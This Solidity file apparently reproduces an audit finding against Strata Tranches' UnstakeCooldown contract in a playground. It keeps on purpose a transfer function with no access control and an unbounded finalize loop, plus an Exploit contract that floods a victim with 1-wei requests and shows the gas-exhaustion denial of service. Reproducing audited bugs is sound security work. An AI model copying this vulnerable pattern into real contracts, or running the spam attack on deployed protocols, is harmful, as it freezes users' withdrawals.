// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Strata Tranches — users can get their withdrawal active requests DoS'd
    by malicious users (Cyfrin 2025-10-08, finding #63223)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: UnstakeCooldown.transfer / request has no access control —
    anyone can push requests for any `to` receiver. finalize() iterates the
    entire array; inflating it causes OOG and freezes the victim's unstakes.
    Blamed push line preserved (@> VULN).

    Gas sample: measure N spam requests, require per-req * REAL_N > block gas.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @notice Reduced UnstakeCooldown — open transfer pushes per-receiver requests.
/// Source: UnstakeCooldown.transfer (Strata Cyfrin 2025-10-08).
contract UnstakeCooldown {
    struct TRequest {
        uint64 unlockAt;
        address proxy;
        uint256 amount;
    }

    mapping(address => TRequest[]) public requestsOf;
    uint256 public cooldown = 7 days;
    MockERC20 public immutable token;

    constructor(MockERC20 t) {
        token = t;
    }

    /// @notice Anyone can call; `to` receives the request — no access control.
    function transfer(address /*token_*/, address to, uint256 amount) external {
        address from = msg.sender;
        // Pull tokens (strategy/user pays)
        token.transferFrom(from, address(this), amount);

        uint64 unlockAt = uint64(block.timestamp + cooldown);
        // FIX: require(msg.sender == to || approved[to][msg.sender]); soft/hard limits
        requestsOf[to].push(TRequest(unlockAt, address(uint160(uint256(keccak256(abi.encode(to, requestsOf[to].length))))), amount)); // @> VULN: no access control — anyone pushes requests for any `to`, inflating finalize loop
    }

    function requestCount(address user) external view returns (uint256) {
        return requestsOf[user].length;
    }

    /// @notice Iterates all requests — OOG if array is huge.
    function finalize(address user) external {
        TRequest[] storage rs = requestsOf[user];
        uint256 n = rs.length;
        uint256 paid;
        for (uint256 i = 0; i < n; i++) {
            TRequest storage r = rs[i];
            // Touch storage + work proportional to real finalize cost
            if (block.timestamp >= r.unlockAt) {
                paid += r.amount;
                // Simulate proxy interaction cost
                r.proxy = r.proxy;
            }
        }
        // Clear (gas-heavy on large n)
        delete requestsOf[user];
        if (paid > 0) token.transfer(user, paid);
    }

    /// @dev Measure gas for finalize after `sample` spam pushes (for sample+extrapolate).
    function measureFinalizeGas(address user) external returns (uint256 gasUsed) {
        uint256 g0 = gasleft();
        this.finalize(user);
        gasUsed = g0 - gasleft();
    }
}

/// CREATE: token(1), cooldown(2)
contract Exploit {
    MockERC20 public token;
    UnstakeCooldown public cooldown;

    uint256 public constant SAMPLE = 80;
    uint256 public constant REAL_N = 35_000; // finding PoC spam count
    uint256 public constant BLOCK_GAS = 30_000_000;

    uint256 public sampleGas;
    uint256 public extrapolatedGas;
    uint256 public victimRequests;

    address public constant VICTIM = address(0xA11CE);
    address public constant ATTACKER = address(0xB0B);

    constructor() {
        token = new MockERC20("USDe", "USDe");
        cooldown = new UnstakeCooldown(token);
    }

    function run() external {
        // Victim has one legitimate large unstake request
        token.mint(address(this), 1000 ether + SAMPLE + 1);
        token.approve(address(cooldown), type(uint256).max);
        cooldown.transfer(address(token), VICTIM, 1000 ether);
        require(cooldown.requestCount(VICTIM) == 1, "victim req");

        // Attacker spams SAMPLE tiny 1-wei requests FOR the victim (no ACL)
        for (uint256 i = 0; i < SAMPLE; i++) {
            cooldown.transfer(address(token), VICTIM, 1);
        }
        victimRequests = cooldown.requestCount(VICTIM);
        require(victimRequests == 1 + SAMPLE, "inflated");

        // Measure finalize gas on the sample, extrapolate to 35k spam
        sampleGas = cooldown.measureFinalizeGas(VICTIM);
        // After finalize, array is cleared — re-seed SAMPLE for per-unit estimate
        // sampleGas includes 1 legitimate + SAMPLE spam
        uint256 perReq = sampleGas / victimRequests;
        extrapolatedGas = perReq * (1 + REAL_N);

        // Harm: extrapolated finalize gas exceeds block limit → permanent DoS
        require(extrapolatedGas > BLOCK_GAS, "DoS not demonstrated");
        require(perReq > 0, "gas");
    }
}
